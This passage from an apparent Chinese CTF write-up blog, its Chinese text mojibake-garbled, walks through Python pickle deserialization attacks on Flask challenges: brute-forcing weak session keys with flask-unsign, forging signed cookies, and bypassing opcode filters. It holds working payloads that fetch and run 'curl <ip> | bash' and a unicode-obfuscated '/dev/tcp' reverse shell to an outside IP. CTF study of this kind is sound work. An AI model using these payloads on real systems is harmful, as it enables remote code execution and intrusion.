render_template(&#x27;index.html&#x27;, status=&#x27;add_success&#x27;, note_id=note_id)@app.route(&#x27;/delete_note&#x27;, methods=[&#x27;POST&#x27;])def delete_note():    note_id = request.form.get(&#x27;note_id&#x27;)    if not note_id:        return render_template(&#x27;index.html&#x27;)        notes = session.get(&#x27;notes&#x27;)    if not notes:        return render_template(&#x27;index.html&#x27;, status=&#x27;delete_failed&#x27;, msg=&#x27;You have no notes&#x27;)        if not notes.get(note_id):        return render_template(&#x27;index.html&#x27;, status=&#x27;delete_failed&#x27;, msg=&#x27;This note does not exist&#x27;)        del notes[note_id]    session[&#x27;notes&#x27;] = notes    return render_template(&#x27;index.html&#x27;, status=&#x27;delete_success&#x27;)if __name__ == &#x27;__main__&#x27;:    app.run(host=&#x27;0.0.0.0&#x27;, port=8000, debug=False)\n\nå‘ç°å¯†é’¥éå¸¸å¼±,å¯ä»¥çˆ†ç ´å‡ºæ¥.å…¶æ¬¡&#x2F;path:note_idè·¯ç”±ä¸‹,pickle.loads è§¦å‘ååºåˆ—åŒ–\n\nç”Ÿæˆå¯†é’¥çˆ†ç ´å­—å…¸\nimport oswhile True:    secret_key=os.urandom(2).hex()    with open(&quot;/var/1.txt&quot;,&quot;a&quot;) as f:        f.write(secret_key+&#x27;\\n&#x27;)\n\nè§£ç åŸæ¥çš„session\nflask-unsign --decode --cookie &quot;.eJwtysEKgjAYAOBXid0HbdPWhA5rKI3IQ9M0b_7mrJgWFBnI3r2CvvM3oeH2bB8omhBfCAi5tZidOMMBYzVeEtJiCk0tKOOkYeL3ZoAi1ElzSDv5p3YqERaK5A5OWKfHOOvFvKpM5lS_dhuab_WYlDQ8Q1HkVxm_v0eXNH3BsHcwmLyWFTleghXy3n8AceAtDQ.ZgDvKw.7CbLZz_NzrKo8ZunE1HPgPKH6U0&quot;\n\nè¾“å‡º:\n&#123;&#x27;notes&#x27;: &#123;&#x27;769b57ff-3d73-433a-811e-2bca92371c39&#x27;: b&#x27;\\x80\\x04\\x956\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x8c\\x08__main__\\x94\\x8c\\x04Note\\x94\\x93\\x94)\\x81\\x94&#125;\\x94(\\x8c\\x05_name\\x94\\x8c\\x011\\x94\\x8c\\x08_content\\x94h\\x06ub.&#x27;&#125;&#125;\n\nvalueé‡Œæ˜¯pickleåºåˆ—åŒ–å­—ç¬¦ä¸²,è¿™æ ·å¯ä»¥çŸ¥é“sessionçš„æ ¼å¼æ˜¯ä»€ä¹ˆ\n\nçˆ†ç ´å¯†é’¥\nflask-unsign --unsign --cookie &quot;.eJwtysEKgjAYAOBXid0HbdPWhA5rKI3IQ9M0b_7mrJgWFBnI3r2CvvM3oeH2bB8omhBfCAi5tZidOMMBYzVeEtJiCk0tKOOkYeL3ZoAi1ElzSDv5p3YqERaK5A5OWKfHOOvFvKpM5lS_dhuab_WYlDQ8Q1HkVxm_v0eXNH3BsHcwmLyWFTleghXy3n8AceAtDQ.ZgDvKw.7CbLZz_NzrKo8ZunE1HPgPKH6U0&quot; -w &quot;/var/1.txt&quot;  --no-literal-eval\n\n\n\n\nâ€‹\tå¾—åˆ°å¯†é’¥f991\n\nç”Ÿæˆpayload\nimport pickleimport osimport base64class aaa():    def __reduce__(self):        return(os.system,(&#x27;curl ip/1 |bash&#x27;,))a = aaa()payload=pickle.dumps(a)print(payload)&quot;&quot;&quot;b&#x27;\\x80\\x04\\x956\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x8c\\x05posix\\x94\\x8c\\x06system\\x94\\x93\\x94\\x8c\\x1bcurl 47.122.131.175/2 |bash\\x94\\x85\\x94R\\x94.&#x27;&quot;&quot;&quot;\n\nä¼ªé€ session\næ ¹æ®ä¸Šé¢æåˆ°çš„sessionæ ¼å¼,ä¼ªé€ session\n&#123;&#x27;notes&#x27;:&#123;&#x27;769b57ff-3d73-433a-811e-2bca92371c39&#x27;:b&#x27;\\x80\\x04\\x956\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x8c\\x05posix\\x94\\x8c\\x06system\\x94\\x93\\x94\\x8c\\x1bcurl 47.122.131.175/2 |bash\\x94\\x85\\x94R\\x94.&#x27;&#125;&#125;\n\nflask-unsign --sign --cookie &quot;&#123;&#x27;notes&#x27;:&#123;&#x27;769b57ff-3d73-433a-811e-2bca92371c39&#x27;:b&#x27;\\x80\\x04\\x956\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x8c\\x05posix\\x94\\x8c\\x06system\\x94\\x93\\x94\\x8c\\x1bcurl 47.122.131.175/2 |bash\\x94\\x85\\x94R\\x94.&#x27;&#125;&#125;&quot; --secret &quot;f991&quot;\n\nå¾—åˆ°session\n.eJwtyk0LgjAYAOC_ErvvsL2rpdBBTURxRZki3XTqdIw6uL4U_3sEPednRre7bUfkzohvnHrNuw5DwwEzgApvCWkxrWXlUOBEgvN7qxq5SHlZcVDeXyD80n9KapiJX5EEMzVRYU1yzLVvdVMmY7w_QarDjxjYW0zhQ1wkSadYdVHSSzrk_fWcmYDt0LIsX5LELaA.aMJwgQ.0eQq7FtPDtVnOK5vI8uw-iWEcx8\n\n\n\n\nå³å¯å¾—åˆ°shell\n[HZNUCTF 2023 preliminary]pickleimport base64import picklefrom flask import Flask, requestapp = Flask(__name__)@app.route(&#x27;/&#x27;)def index():    with open(&#x27;app.py&#x27;, &#x27;r&#x27;) as f:        return f.read()@app.route(&#x27;/calc&#x27;, methods=[&#x27;GET&#x27;])def getFlag():    payload = request.args.get(&quot;payload&quot;)    pickle.loads(base64.b64decode(payload).replace(b&#x27;os&#x27;, b&#x27;&#x27;))    return &quot;ganbadie!&quot;@app.route(&#x27;/readFile&#x27;, methods=[&#x27;GET&#x27;])def readFile():    filename = request.args.get(&#x27;filename&#x27;).replace(&quot;flag&quot;, &quot;????&quot;)    with open(filename, &#x27;r&#x27;) as f:        return f.read()if __name__ == &#x27;__main__&#x27;:    app.run(host=&#x27;0.0.0.0&#x27;)\n\næ¼æ´ä»£ç :\n@app.route(&#x27;/calc&#x27;, methods=[&#x27;GET&#x27;])def getFlag():    payload = request.args.get(&quot;payload&quot;)    pickle.loads(base64.b64decode(payload).replace(b&#x27;os&#x27;, b&#x27;&#x27;))    return &quot;ganbadie!&quot;\n\næ‹¼æ¥ä¸€ä¸‹oså³å¯,ç”¨æ²¡æœ‰osçš„payload\nimport pickleimport base64 class A(object):    def __reduce__(self):        return (eval, (&quot;__import__(&#x27;o&#x27;+&#x27;s&#x27;).popen(&#x27;curl 47.122.131.175/2 | bash&#x27;).read()&quot;,))    a = A()a = pickle.dumps(a)print(base64.b64encode(a))\n\nç›´æ¥å¼¹shell\n\nNSSCTF&#123;379bf252-10f4-404b-be5f-173b80e7d8b2&#125;\n\nåŸºäºopcodeç»•è¿‡å­—èŠ‚ç è¿‡æ»¤å¯¹äºä¸€äº›é¢˜ä¼šå¯¹ä¼ å…¥çš„æ•°æ®è¿›è¡Œè¿‡æ»¤\nä¾‹å¦‚\n1.if b&#39;R&#39; in code or b&#39;built&#39; in code or b&#39;setstate&#39; in code or b&#39;flag&#39; in code\n2.a = base64.b64decode(session.get(&#39;ser_data&#39;)).replace(b&quot;builtin&quot;, b&quot;BuIltIn&quot;).replace(b&quot;os&quot;, b&quot;Os&quot;).replace(b&quot;bytes&quot;, b&quot;Bytes&quot;) if b&#39;R&#39; in a or b&#39;i&#39; in a or b&#39;o&#39; in a or b&#39;b&#39; in a:\nè¿™ä¸ªæ—¶å€™è€ƒè™‘ç”¨ç”¨åˆ°opcode\nä»€ä¹ˆæ˜¯opcode\nPython çš„ opcodeï¼ˆoperation codeï¼‰æ˜¯ä¸€ç»„åŸå§‹æŒ‡ä»¤ï¼Œç”¨äºåœ¨ Python è§£é‡Šå™¨ä¸­æ‰§è¡Œå­—èŠ‚ç ã€‚æ¯ä¸ª opcodeéƒ½æ˜¯æ˜¯ä¸€ä¸ªæ ‡è¯†ç¬¦ï¼Œä»£è¡¨ä¸€ç§ç‰¹å®šçš„æ“ä½œæˆ–æŒ‡ä»¤ã€‚ åœ¨ Python ä¸­ï¼Œæºä»£ç é¦–å…ˆè¢«ç¼–è¯‘ä¸ºå­—èŠ‚ç ï¼Œç„¶åç”±è§£é‡Šå™¨é€æ¡æ‰§è¡Œå­—èŠ‚ç æŒ‡ä»¤ã€‚è¿™äº›æŒ‡ä»¤ä»¥ opcode çš„å½¢å¼å­˜å‚¨åœ¨å­—èŠ‚ç å¯¹è±¡ä¸­ï¼Œå¹¶ç”±Python è§£é‡Šå™¨æŒ‰é¡ºåºè§£é‡Šå’Œæ‰§è¡Œã€‚\næ¯ä¸ª opcode éƒ½æœ‰å…¶ç‰¹å®šçš„åŠŸèƒ½ï¼Œç”¨äºæ‰§è¡Œä¸åŒçš„æ“ä½œï¼Œä¾‹å¦‚å˜é‡åŠ è½½ã€å‡½æ•°è°ƒç”¨ã€æ•°å€¼è¿ç®—ã€æ§åˆ¶æµç¨‹ç­‰ã€‚Python æä¾›äº†å¤§é‡çš„ opcodeï¼Œä»¥æ”¯æŒå„ç§æ“ä½œå’Œè¯­è¨€ç‰¹æ€§ã€‚\n\nINST iã€OBJ oã€REDUCE R éƒ½å¯ä»¥è°ƒç”¨ä¸€ä¸ª callable å¯¹è±¡\nå¦‚ä½•ç¼–å†™è¾…åŠ©ç”Ÿæˆå·¥å…·pkerï¼šhttps://github.com/eddieivan01/pker\nä¸€èˆ¬ç”¨äºç»•è¿‡ find_class é»‘åå•&#x2F;ç™½åå•é™åˆ¶\npkerç”¨æ³•\n\nGLOBAL å¯¹åº”opcodeï¼šbâ€™câ€™ è·å–moduleä¸‹çš„ä¸€ä¸ªå…¨å±€å¯¹è±¡ï¼ˆæ²¡æœ‰importçš„ä¹Ÿå¯ä»¥ï¼Œæ¯”å¦‚ä¸‹é¢çš„osï¼‰ï¼š GLOBAL(â€˜osâ€™, â€˜systemâ€™) è¾“å…¥ï¼šmodule,instance(callableã€moduleéƒ½æ˜¯instance)\nINST å¯¹åº”opcodeï¼šbâ€™iâ€™ å»ºç«‹å¹¶å…¥æ ˆä¸€ä¸ªå¯¹è±¡ï¼ˆå¯ä»¥æ‰§è¡Œä¸€ä¸ªå‡½æ•°ï¼‰ï¼š INST(â€˜osâ€™, â€˜systemâ€™, â€™lsâ€™)è¾“å…¥ï¼šmodule,callable,para\nOBJ å¯¹åº”opcodeï¼šbâ€™oâ€™ å»ºç«‹å¹¶å…¥æ ˆä¸€ä¸ªå¯¹è±¡ï¼ˆä¼ å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºcallableï¼Œå¯ä»¥æ‰§è¡Œä¸€ä¸ªå‡½æ•°ï¼‰ï¼‰ï¼š OBJ(GLOBAL(â€˜osâ€™, â€˜systemâ€™), â€™lsâ€™) è¾“å…¥ï¼šcallable,para\nxxx(xx,â€¦) å¯¹åº”opcodeï¼šbâ€™Râ€™ ä½¿ç”¨å‚æ•°xxè°ƒç”¨å‡½æ•°xxxï¼ˆå…ˆå°†å‡½æ•°å…¥æ ˆï¼Œå†å°†å‚æ•°å…¥æ ˆå¹¶è°ƒç”¨ï¼‰\nli[0]&#x3D;321 æˆ– globals_dic[â€™local_varâ€™]&#x3D;â€˜helloâ€™ å¯¹åº”opcodeï¼šbâ€™sâ€™ æ›´æ–°åˆ—è¡¨æˆ–å­—å…¸çš„æŸé¡¹çš„å€¼\nxx.attr&#x3D;123 å¯¹åº”opcodeï¼šbâ€™bâ€™ å¯¹xxå¯¹è±¡è¿›è¡Œå±æ€§è®¾ç½®\nreturn å¯¹åº”opcodeï¼šbâ€™0â€™ å‡ºæ ˆï¼ˆä½œä¸ºpickle.loadså‡½æ•°çš„è¿”å›å€¼ï¼‰ï¼š return xxx # æ³¨æ„ï¼Œä¸€æ¬¡åªèƒ½è¿”å›ä¸€ä¸ªå¯¹è±¡æˆ–ä¸è¿”å›å¯¹è±¡ï¼ˆå°±ç®—ç”¨é€—å·éš”å¼€ï¼Œæœ€åä¹Ÿåªè¿”å›ä¸€ä¸ªå…ƒç»„ï¼‰\n\nå¯¹äºåšé¢˜è€Œè¨€ä¼šopacheæ”¹å†™å°±è¡Œäº†\nINST iã€OBJ oã€REDUCE R éƒ½å¯ä»¥è°ƒç”¨ä¸€ä¸ª callable å¯¹è±¡\nRCE demo:R:b&#x27;&#x27;&#x27;cos\\nsystem\\n(S&#x27;whoami&#x27;\\ntR.&#x27;&#x27;&#x27;ib&#x27;&#x27;&#x27;(S&#x27;whoami&#x27;\\nios\\nsystem\\n.&#x27;&#x27;&#x27;ob&#x27;&#x27;&#x27;(cos\\nsystem\\nS&#x27;whoami&#x27;\\no.&#x27;&#x27;&#x27;æ— R,i,o oså¯è¿‡b&#x27;&#x27;&#x27;(cos\\nsystem\\nS&#x27;calc&#x27;\\nos.&#x27;&#x27;&#x27;æ— R,i,o os å¯è¿‡  + å…³é”®è¯è¿‡æ»¤b&#x27;&#x27;&#x27;(S&#x27;key1&#x27;\\nS&#x27;val1&#x27;\\ndS&#x27;vul&#x27;\\n(cos\\nsystem\\nVcalc\\nos.&#x27;&#x27;&#x27;Væ“ä½œç æ˜¯å¯ä»¥è¯†åˆ«\\u (unicodeç¼–ç ç»•è¿‡)ç‰¹åˆ«æ˜¯å‘½ä»¤æœ‰ç‰¹æ®ŠåŠŸèƒ½å­—ç¬¦\n\nä¾‹é¢˜[MTCTF 2022]easypickleimport base64import picklefrom flask import Flask, sessionimport osimport randomapp = Flask(__name__)app.config[&#x27;SECRET_KEY&#x27;] = os.urandom(2).hex()@app.route(&#x27;/&#x27;)def hello_world():    if not session.get(&#x27;user&#x27;):        session[&#x27;user&#x27;] = &#x27;&#x27;.join(random.choices(&quot;admin&quot;, k=5))    return &#x27;Hello &#123;&#125;!&#x27;.format(session[&#x27;user&#x27;])@app.route(&#x27;/admin&#x27;)def admin():    if session.get(&#x27;user&#x27;) != &quot;admin&quot;:        return f&quot;&lt;script&gt;alert(&#x27;Access Denied&#x27;);window.location.href=&#x27;/&#x27;&lt;/script&gt;&quot;    else:        try:            a = base64.b64decode(session.get(&#x27;ser_data&#x27;)).replace(b&quot;builtin&quot;, b&quot;BuIltIn&quot;).replace(b&quot;os&quot;, b&quot;Os&quot;).replace(b&quot;bytes&quot;, b&quot;Bytes&quot;)            if b&#x27;R&#x27; in a or b&#x27;i&#x27; in a or b&#x27;o&#x27; in a or b&#x27;b&#x27; in a:                raise pickle.UnpicklingError(&quot;R i o b is forbidden&quot;)            pickle.loads(base64.b64decode(session.get(&#x27;ser_data&#x27;)))            return &quot;ok&quot;        except:            return &quot;error!&quot;if __name__ == &#x27;__main__&#x27;:    app.run(host=&#x27;0.0.0.0&#x27;, port=8888)\n\næ¼æ´ä»£ç :\n@app.route(&#x27;/admin&#x27;)def admin():    if session.get(&#x27;user&#x27;) != &quot;admin&quot;:        return f&quot;&lt;script&gt;alert(&#x27;Access Denied&#x27;);window.location.href=&#x27;/&#x27;&lt;/script&gt;&quot;    else:        try:            a = base64.b64decode(session.get(&#x27;ser_data&#x27;)).replace(b&quot;builtin&quot;, b&quot;BuIltIn&quot;).replace(b&quot;os&quot;, b&quot;Os&quot;).replace(b&quot;bytes&quot;, b&quot;Bytes&quot;)            if b&#x27;R&#x27; in a or b&#x27;i&#x27; in a or b&#x27;o&#x27; in a or b&#x27;b&#x27; in a:                raise pickle.UnpicklingError(&quot;R i o b is forbidden&quot;)            pickle.loads(base64.b64decode(session.get(&#x27;ser_data&#x27;)))            return &quot;ok&quot;        except:            return &quot;error!&quot;\n\nè¿™é¢˜çš„å¯†é’¥è¿˜æ˜¯ä¸€ä¸ªå¼±å£ä»¤,å¯ä»¥çˆ†ç ´\nç»•è¿‡R i o bè¿‡æ»¤å…¶å®ä»”ç»†è§‚å¯Ÿä»£ç ï¼Œå‘ç°å…¶å®æœ€ç»ˆä½¿ç”¨çš„ååºåˆ—åŒ–æ•°æ®å¹¶ä¸æ˜¯ç»è¿‡replaceä¹‹åçš„aï¼Œè€Œæ˜¯ä»sessionä¸­è·å¾—çš„\næ‰€ä»¥å®é™…ä¸Šæˆ‘ä»¬ç»è¿‡replaceä¹‹åçš„osè¿˜æ˜¯å°å†™çš„\næˆ‘ä»¬å¯ä»¥ä½¿ç”¨pickleæ„é€ os.systemå»åå¼¹shell\nimport base64opcode = b&quot;&quot;&quot;(cossystemV\\u0062\\u0061\\u0073\\u0068\\u0020\\u002d\\u0063\\u0020\\u0027\\u0073\\u0068\\u0020\\u002d\\u0069\\u0020\\u003e\\u0026\\u0020\\u002f\\u0064\\u0065\\u0076\\u002f\\u0074\\u0063\\u0070\\u002f\\u0034\\u0037\\u002e\\u0031\\u0032\\u0032\\u002e\\u0031\\u0033\\u0031\\u002e\\u0031\\u0037\\u0035\\u002f\\u0032\\u0033\\u0033\\u0033\\u0020\\u0030\\u003e\\u0026\\u0031\\u0027os.&quot;&quot;&quot;print(base64.b64encode(opcode))&quot;&quot;&quot;b&#x27;KGNvcwpzeXN0ZW0KVlx1MDA2Mlx1MDA2MVx1MDA3M1x1MDA2OFx1MDAyMFx1MDAyZFx1MDA2M1x1MDAyMFx1MDAyN1x1MDA3M1x1MDA2OFx1MDAyMFx1MDAyZFx1MDA2OVx1MDAyMFx1MDAzZVx1MDAyNlx1MDAyMFx1MDAyZlx1MDA2NFx1MDA2NVx1MDA3Nlx1MDAyZlx1MDA3NFx1MDA2M1x1MDA3MFx1MDAyZlx1MDAzNFx1MDAzN1x1MDAyZVx1MDAzMVx1MDAzMlx1MDAzMlx1MDAyZVx1MDAzMVx1MDAzM1x1MDAzMVx1MDAyZVx1MDAzMVx1MDAzN1x1MDAzNVx1MDAyZlx1MDAzMlx1MDAzM1x1MDAzM1x1MDAzM1x1MDAyMFx1MDAzMFx1MDAzZVx1MDAyNlx1MDAzMVx1MDAyNwpvcy4K&#x27;&quot;&quot;&quot;\n\næœ¬æ¥æˆ‘ä»¬opcodeå®é™…åº”è¯¥å†™ä¸ºè¿™æ ·çš„ï¼š\nopcode = b&quot;&quot;&quot;(cossystemS&#x27;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#x27;os.&quot;&quot;&quot;\n\nä½†æ˜¯ç”±äºiè¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦è¿›è¡Œç»•è¿‡ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨VæŒ‡ä»¤ï¼ŒVæŒ‡ä»¤å¯ä»¥è¯†åˆ«Unicodeç¼–ç \nè¿™æ ·å°±å¯ä»¥å°†åå¼¹shellè¿›è¡Œunicodeç¼–ç ç»•è¿‡\n\nç”Ÿæˆè§£å¯†è„šæœ¬\nimport oswhile True:    secret_key=os.urandom(2).hex()    with open(&quot;/var/1.txt&quot;,&quot;a&quot;) as f:        f.write(secret_key+&#x27;\\n&#x27;)\n\nè§£å¯†åŸå§‹session\nflask-unsign --decode --cookie &quot;eyJ1c2VyIjoiZGRpZG0ifQ.aMKvSQ.YsCqPJ-V9t24NtfJjxsjOczpr88&quot;\n\n\n\nçˆ†ç ´å¯†é’¥\nflask-unsign --unsign --cookie &quot;eyJ1c2VyIjoiZGRpZG0ifQ.aMKvSQ.YsCqPJ-V9t24NtfJjxsjOczpr88&quot; -w &quot;/var/1.txt&quot;  --no-literal-eval\n\n\n\n\nâ€‹\tæ‰¾åˆ°å¯†é’¥æ˜¯95c9\n\næ„é€  payload\næ„é€ ç±»ä¼¼çš„payload&#123;&#39;user&#39;:&#39;admin&#39;,&#39;ser_data&#39;:&#39;payload&#39;&#125;\nå¯¹æ›¿æ¢åçš„ a è¿›è¡Œæ£€æŸ¥ R i o b ä½†æ˜¯å®é™…ååºåˆ—åŒ–çš„æ˜¯ser_data\nå› æ­¤osä¸­oå¯ä»¥å­˜åœ¨ï¼Œä½†æ˜¯å•ç‹¬çš„oæ˜¯è¢«ç¦æ­¢çš„ï¼Œå› ä¸ºosè¢«æ›¿æ¢æˆOsï¼Œä½†å¯¹åç»­ser_dataä¸å½±å“\n\n\nå°†å‰é¢çš„opcode base64ä¸€ä¸‹\nb&#x27;KGNvcwpzeXN0ZW0KVlx1MDA2Mlx1MDA2MVx1MDA3M1x1MDA2OFx1MDAyMFx1MDAyZFx1MDA2M1x1MDAyMFx1MDAyN1x1MDA3M1x1MDA2OFx1MDAyMFx1MDAyZFx1MDA2OVx1MDAyMFx1MDAzZVx1MDAyNlx1MDAyMFx1MDAyZlx1MDA2NFx1MDA2NVx1MDA3Nlx1MDAyZlx1MDA3NFx1MDA2M1x1MDA3MFx1MDAyZlx1MDAzNFx1MDAzN1x1MDAyZVx1MDAzMVx1MDAzMlx1MDAzMlx1MDAyZVx1MDAzMVx1MDAzM1x1MDAzMVx1MDAyZVx1MDAzMVx1MDAzN1x1MDAzNVx1MDAyZlx1MDAzMlx1MDAzM1x1MDAzM1x1MDAzM1x1MDAyMFx1MDAzMFx1MDAzZVx1MDAyNlx1MDAzMVx1MDAyNwpvcy4K&#x27;\n\n\nä¼ªé€ sessionå¦‚ä¸‹:\n&#123;&#x27;user&#x27;:&#x27;admin&#x27;,&#x27;ser_data&#x27;:&#x27;KGNvcwpzeXN0ZW0KVlx1MDA2Mlx1MDA2MVx1MDA3M1x1MDA2OFx1MDAyMFx1MDAyZFx1MDA2M1x1MDAyMFx1MDAyN1x1MDA3M1x1MDA2OFx1MDAyMFx1MDAyZFx1MDA2OVx1MDAyMFx1MDAzZVx1MDAyNlx1MDAyMFx1MDAyZlx1MDA2NFx1MDA2NVx1MDA3Nlx1MDAyZlx1MDA3NFx1MDA2M1x1MDA3MFx1MDAyZlx1MDAzNFx1MDAzN1x1MDAyZVx1MDAzMVx1MDAzMlx1MDAzMlx1MDAyZVx1MDAzMVx1MDAzM1x1MDAzMVx1MDAyZVx1MDAzMVx1MDAzN1x1MDAzNVx1MDAyZlx1MDAzMlx1MDAzM1x1MDAzM1x1MDAzM1x1MDAyMFx1MDAzMFx1MDAzZVx1MDAyNlx1MDAzMVx1MDAyNwpvcy4K&#x27;&#125;\n\nsessionç­¾å:\nflask-unsign --sign --cookie &#123;&#x27;user&#x27;:&#x27;admin&#x27;,&#x27;ser_data&#x27;:&#x27;KGNvcwpzeXN0ZW0KVlx1MDA2Mlx1MDA2MVx1MDA3M1x1MDA2OFx1MDAyMFx1MDAyZFx1MDA2M1x1MDAyMFx1MDAyN1x1MDA3M1x1MDA2OFx1MDAyMFx1MDAyZFx1MDA2OVx1MDAyMFx1MDAzZVx1MDAyNlx1MDAyMFx1MDAyZlx1MDA2NFx1MDA2NVx1MDA3Nlx1MDAyZlx1MDA3NFx1MDA2M1x1MDA3MFx1MDAyZlx1MDAzNFx1MDAzN1x1MDAyZVx1MDAzMVx1MDAzMlx1MDAzMlx1MDAyZVx1MDAzMVx1MDAzM1x1MDAzMVx1MDAyZVx1MDAzMVx1MDAzN1x1MDAzNVx1MDAyZlx1MDAzMlx1MDAzM1x1MDAzM1x1MDAzM1x1MDAyMFx1MDAzMFx1MDAzZVx1MDAyNlx1MDAzMVx1MDAyNwpvcy4K&#x27;&#125; --secret 95c9\n\nå¾—åˆ°\n.eJyrViotTi1SslJKTMnNzFPSUQLy4lMSSxKBQt7ufmXJ5QVVqRF-BlHhBt5hORWGvi6ORr4wOgxMG_saQvj-bmC60hdKR7lB1RmiivsZEqfPPwxFvCoKyvfLQVMPdY8fVJ8f1F0wdVB5Yz9U9xij6a-CyldB3VcJta_KF0bnoNCY8oYofAx5qLlVfmGo9sLNNcRKw_2PIxzg9vmVF5QlV5p4K9UCAPj_lEc.aMK5Ig.iWElfcilB7JypeNTDXdbahkQpzo\n\næ”¹cookie,å¼¹shell\n\n\n\nNSSCTF&#123;5b06a3c8-2698-438e-9672-7eb32edefa53&#125;\n","categories":["python,pickle"],"tags":["python,pickle,ååºåˆ—åŒ–"]},{"title":"sessionååºåˆ—åŒ–","url":"/2025/09/27/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","content":"ä»€ä¹ˆæ˜¯sessionåœ¨è®²php sessionååºåˆ—åŒ–ä¹‹å‰,å¿…é¡»çŸ¥é“ä»€ä¹ˆæ˜¯session\nSessionä¸€èˆ¬ç§°ä¸ºâ€œä¼šè¯æ§åˆ¶â€œï¼Œç®€å•æ¥è¯´å°±æ˜¯æ˜¯ä¸€ç§å®¢æˆ·ä¸ç½‘ç«™&#x2F;æœåŠ¡å™¨æ›´ä¸ºå®‰å…¨çš„å¯¹è¯æ–¹å¼ã€‚ä¸€æ—¦å¼€å¯äº† session ä¼šè¯ï¼Œä¾¿å¯ä»¥åœ¨ç½‘ç«™çš„ä»»ä½•é¡µé¢ä½¿ç”¨æˆ–ä¿æŒè¿™ä¸ªä¼šè¯ï¼Œä»è€Œè®©è®¿é—®è€…ä¸ç½‘ç«™ä¹‹é—´å»ºç«‹äº†ä¸€ç§â€œå¯¹è¯â€æœºåˆ¶ã€‚ä¸åŒè¯­è¨€çš„ä¼šè¯æœºåˆ¶å¯èƒ½æœ‰æ‰€ä¸åŒï¼Œè¿™é‡Œä»…è®¨è®ºPHP sessionæœºåˆ¶ã€‚\nPHP sessionå¯ä»¥çœ‹åšæ˜¯ä¸€ä¸ªç‰¹æ®Šçš„å˜é‡ï¼Œä¸”è¯¥å˜é‡æ˜¯ç”¨äºå­˜å‚¨å…³äºç”¨æˆ·ä¼šè¯çš„ä¿¡æ¯ï¼Œæˆ–è€…æ›´æ”¹ç”¨æˆ·ä¼šè¯çš„è®¾ç½®ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒPHP Session å˜é‡å­˜å‚¨å•ä¸€ç”¨æˆ·çš„ä¿¡æ¯ï¼Œå¹¶ä¸”å¯¹äºåº”ç”¨ç¨‹åºä¸­çš„æ‰€æœ‰é¡µé¢éƒ½æ˜¯å¯ç”¨çš„ï¼Œä¸”å…¶å¯¹åº”çš„å…·ä½“ session å€¼ä¼šå­˜å‚¨äºæœåŠ¡å™¨ç«¯ï¼Œè¿™ä¹Ÿæ˜¯ä¸ cookieçš„ä¸»è¦åŒºåˆ«ï¼Œæ‰€ä»¥seesion çš„å®‰å…¨æ€§ç›¸å¯¹è¾ƒé«˜ã€‚\nPHP Session çš„å·¥ä½œæµç¨‹sessionçš„å·¥ä½œæµç¨‹å¾ˆç®€å•,å½“å¼€å§‹ä¸€ä¸ªä¼šè¯æ—¶,phpä¼šå°è¯•ä»è¯·æ±‚ä¸­æŸ¥æ‰¾ä¼šè¯ID(é€šå¸¸é€šè¿‡ä¼šè¯cookie),å¦‚æœå‘ç°è¯·æ±‚çš„cookie,get,postä¸­ä¸å­˜åœ¨session id,phpå°±ä¼šè‡ªåŠ¨è°ƒç”¨php_session_create_idå‡½æ•°åˆ›å»ºä¸€ä¸ªæ–°çš„ä¼šè¯,å¹¶ä¸”åœ¨http responseæŠ¥æ–‡ä¸­é€šè¿‡set-cookieå¤´éƒ¨å‘é€ç»™å®¢æˆ·ç«¯ä¿å­˜,å¦‚å›¾:\n\næœ‰æ—¶å€™æµè§ˆå™¨çš„ç”¨æˆ·è®¾ç½®ä¸­ä¼šç¦æ­¢cookie,å½“æµè§ˆå™¨å®¢æˆ·ç«¯ä¸­çš„cookieè¢«ç¦ç”¨çš„æƒ…å†µä¸‹,phpä¹Ÿå¯ä»¥è‡ªåŠ¨å°†session idæ·»åŠ åˆ°urlå‚æ•°ä¸­ä»¥åŠformçš„hiddenå­—æ®µä¸­ï¼Œä½†è¿™éœ€è¦å°†php.iniä¸­çš„session.use_trans_sidè®¾ä¸ºå¼€å¯ï¼Œä¹Ÿå¯ä»¥åœ¨è¿è¡Œæ—¶è°ƒç”¨ini_setæ¥è®¾ç½®è¿™ä¸ªé…ç½®é¡¹ã€‚\nä¼šè¯å¼€å§‹ä¹‹åï¼ŒPHP å°±ä¼šå°†ä¼šè¯ä¸­çš„æ•°æ®è®¾ç½®åˆ° $_SESSION å˜é‡ä¸­ï¼Œå¦‚ä¸‹è¿°ä»£ç å°±æ˜¯ä¸€ä¸ªåœ¨ $_SESSION å˜é‡ä¸­æ³¨å†Œå˜é‡çš„ä¾‹å­ï¼š\n&lt;?phpsession_start();if (!isset($_SESSION[&#x27;username&#x27;])) &#123;  \t$_SESSION[&#x27;username&#x27;] = &#x27;xianzhi&#x27; ;&#125;?&gt;\n\nå½“phpåœæ­¢çš„æ—¶å€™,phpä¼šä½¿ç”¨å…¶å†…ç½®çš„æ–‡ä»¶ä¼šè¯ä¿å­˜ç®¡ç†å™¨æ¥å®Œæˆå¯¹sessionçš„ä¿å­˜,ä¹Ÿå¯ä»¥é€šè¿‡é…ç½®é¡¹session.save_handler\næ¥ä¿®æ”¹æ‰€è¦é‡‡ç”¨çš„æ–‡ä»¶ä¼šè¯ä¿å­˜ç®¡ç†å™¨ã€‚å¯¹äºæ–‡ä»¶ä¼šè¯ä¿å­˜ç®¡ç†å™¨ï¼Œä¼šå°†ä¼šè¯æ•°æ®ä¿å­˜åˆ°é…ç½®é¡¹session.save_pathæ‰€æŒ‡å®šçš„ä½ç½®ã€‚\næ•´ä¸ªæµç¨‹å¤§æ¦‚å¦‚ä¸Šæ‰€è¿°ï¼Œä¹Ÿå¯å‚è€ƒä¸‹è¿°æµç¨‹å›¾ï¼š\n\nPHP session åœ¨ php.ini ä¸­çš„é…ç½®PHP sessionåœ¨php.iniä¸­ä¸»è¦å­˜åœ¨ä»¥ä¸‹é…ç½®é¡¹ï¼š\n\nsession.gc_divisor\nphp sessionåƒåœ¾å›æ”¶æœºåˆ¶ç›¸å…³é…ç½®\n\nsession.sid_bits_per_character\næŒ‡å®šç¼–ç 